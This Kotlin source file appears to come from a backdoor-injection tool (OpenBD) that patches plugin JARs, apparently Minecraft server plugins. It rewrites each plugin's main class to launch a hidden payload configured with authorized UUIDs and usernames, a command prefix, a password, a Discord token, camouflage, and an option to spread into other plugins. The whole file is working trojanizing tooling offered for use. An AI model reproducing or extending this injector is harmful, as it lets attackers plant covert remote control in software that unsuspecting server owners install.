package com.tmquan2508.inject.injector

import com.github.ajalt.mordant.rendering.TextColors.brightCyan
import com.tmquan2508.inject.OpenBDConfig
import com.tmquan2508.inject.cli.Logs
import com.tmquan2508.inject.injector.modules.*
import com.tmquan2508.inject.utils.loadDefaultPayload
import java.io.File
import java.nio.file.Files
import java.nio.file.Path
import java.nio.file.StandardCopyOption
import java.security.MessageDigest

fun patchPlugin(
    input: Path,
    output: Path,
    replace: Boolean,
    camouflage: Boolean,
    config: OpenBDConfig
) {
    val patcher = Patcher(input, output, replace, camouflage, config)
    try {
        patcher.run()
    } catch (e: Exception) {
        Logs.finish().error("An error occurred while patching ${input.fileName}: ${e.message}")
        e.printStackTrace()
    } finally {
        patcher.cleanup()
    }
}

private class Patcher(
    private val input: Path,
    private val output: Path,
    private val replace: Boolean,
    private val camouflage: Boolean,
    private val config: OpenBDConfig
) {
    private val tempDir = File("./.openbd")
    private val tempJar = File(tempDir, "current_patch.jar")

    private lateinit var targetInfo: TargetJarInfo
    private lateinit var processedPayload: ProcessedPayload
    private lateinit var modifiedMainClassBytes: ByteArray

    fun run() {
        Logs.task("Patching ${input.fileName}")
        if (!replace && Files.exists(output)) {
            Logs.finish().warn("Skipped because output file already exists: ${output.fileName}")
            return
        }

        prepareWorkspace()

        analyzeTarget()

        processPayload()

        patchMainClass()

        assembleJar()

        Files.copy(tempJar.toPath(), output, StandardCopyOption.REPLACE_EXISTING)
        Logs.finish().info("Successfully patched ${input.fileName} -> ${output.fileName}")
    }

    fun cleanup() {
        if (tempDir.exists()) tempDir.deleteRecursively()
    }

    private fun prepareWorkspace() {
        Logs.info("[STEP 0] Preparing temporary workspace...")
        tempDir.mkdirs()
        Files.copy(input, tempJar.toPath(), StandardCopyOption.REPLACE_EXISTING)
    }

    private fun analyzeTarget() {
        Logs.info("[STEP 1] Analyzing target JAR...")
        targetInfo = analyzeTargetJar(tempJar.toPath())
        Logs.info(" -> Found main class: ${brightCyan(targetInfo.mainClassName)}")
    }

    private fun processPayload() {
        Logs.info("[STEP 2] Processing payload (relocating & configuring)...")
        processedPayload = processPayload(
            rawPayloadClasses = loadDefaultPayload(),
            camouflageEnabled = camouflage,
            targetJar = tempJar,
            uuids = config.authorizedUuids.joinToString(","),
            usernames = config.authorizedUsernames.joinToString(","),
            prefix = config.commandPrefix,
            injectOther = config.injectIntoOtherPlugins.toString(),
            warnings = config.displayDebugMessages.toString(),
            discordToken = config.discordToken,
            password = config.password?.toSha256() ?: "",
            camouflage = camouflage.toString()
        )
    }

    private fun patchMainClass() {
        Logs.info("[STEP 3] Patching main class entrypoint...")
        modifiedMainClassBytes = patchMainClass(
            originalMainClassBytes = targetInfo.mainClassBytes,
            finalPayloadClasses = processedPayload.finalClasses,
            finalMainPayloadCallName = processedPayload.finalMainPayloadName.replace('/', '.')
        )
    }

    private fun assembleJar() {
        Logs.info("[STEP 4] Assembling final JAR file...")
        assembleFinalJar(
            jarPath = tempJar.toPath(),
            modifiedMainClassBytes = modifiedMainClassBytes,
            mainClassPath = targetInfo.mainClassPath,
            finalPayloadClasses = processedPayload.finalClasses
        )
    }

    private fun String.toSha256(): String = MessageDigest.getInstance("SHA-256")
        .digest(this.toByteArray()).joinToString("") { "%02x".format(it) }
}